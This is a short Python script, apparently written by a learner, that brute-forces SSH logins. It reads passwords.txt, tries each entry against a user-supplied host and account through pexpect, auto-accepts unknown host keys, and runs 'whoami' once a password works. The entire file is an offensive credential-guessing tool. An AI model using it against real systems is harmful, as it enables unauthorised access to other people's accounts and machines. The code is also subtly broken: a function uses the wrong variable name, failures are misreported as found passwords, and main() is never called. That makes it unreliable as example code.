#!/usr/bin/python

import pexpect
from termcolor import colored
PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(connection,command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)


#This program will bruteforce the ssh
def connect(user, host, password):
    #When we login via metaspoint it asks us whether we want to remember it
    ssh_newkey = 'Are you sure you want to continue connecting'
    #We want to just say yes
    connStr = 'ssh ' +  user + '@' + host
    child = pexpect.spawn(connStr) # libary
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: ' ])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print ('[-] Error Conhnecting')
            return
    child.sendline(password)
    child.expect(PROMPT, timeout=0.5 )
    return child

def main():
    host = raw_input("Enter the Ip Address of Target To Bruteforce: ")
    user = raw_input("Enter user Account You Want To Bruteforce")
    #NEed a password file, with multiple Passsword files that will bruteforce
    #The Passwords

    file = open("passwords.txt", "r")
    for password in file.readlines():
        #read file line by line
        password = password.strip("\n")
        #print(password)
        try:
            child = connect(user, host, password)
            print(colored(" [+] Password Found:" + password, 'green'))
            send_command(child, 'whoami') # We can execute any terminal command
        except:
            print( colored("[-] Wrong PAssword:" + password, 'red'))
